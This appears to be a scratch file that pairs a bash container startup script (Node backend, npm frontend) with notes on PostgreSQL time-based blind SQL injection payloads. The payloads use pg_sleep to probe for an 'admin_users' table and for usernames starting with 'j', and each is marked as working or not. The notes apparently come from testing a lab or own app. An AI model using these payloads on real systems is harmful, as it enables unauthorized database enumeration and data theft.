#!/bin/bash

# Start backend
cd /app/backend
node server.js &

# Start frontend
cd /app/frontend
npm run dev -- --host 0.0.0.0

# Keep container running
wait


laptop' AND (SELECT pg_sleep(5)) IS NULL--
working
laptop' OR (SELECT pg_sleep(5)) IS NULL--
wroking
laptop' AND EXISTS(SELECT pg_sleep(5))--
not wokring
laptop' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin_users') AND (SELECT pg_sleep(5)) IS NULL--
working
laptop' AND EXISTS(SELECT 1 FROM users WHERE username LIKE 'j%') AND (SELECT pg_sleep(5)) IS NULL--
not working
